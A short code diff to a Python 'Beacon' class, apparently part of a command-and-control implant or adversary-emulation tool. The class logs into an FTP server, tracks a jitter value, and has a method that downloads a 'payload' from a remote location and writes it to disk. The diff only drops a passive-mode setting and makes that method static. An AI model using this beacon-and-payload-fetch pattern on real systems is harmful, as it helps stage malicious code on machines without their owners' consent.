@@ -40,7 +40,6 @@ class Beacon:
     def __init__(self, host, user, password, jitter):
         self.ftp = FTP(host)
         self.ftp.login(user, password)
-        self.ftp.set_pasv(False)
         self.jitter = jitter
         self.target = host
         self.links = []
@@ -84,7 +83,8 @@ class Beacon:
             Sleep=self.jitter
         )
 
-    def _download_payload(self, name, location):
+    @staticmethod
+    def _download_payload(name, location):
         r = requests.get(location)
         with open(name, 'w') as fh:
             fh.write(r.content.decode('utf-8'))
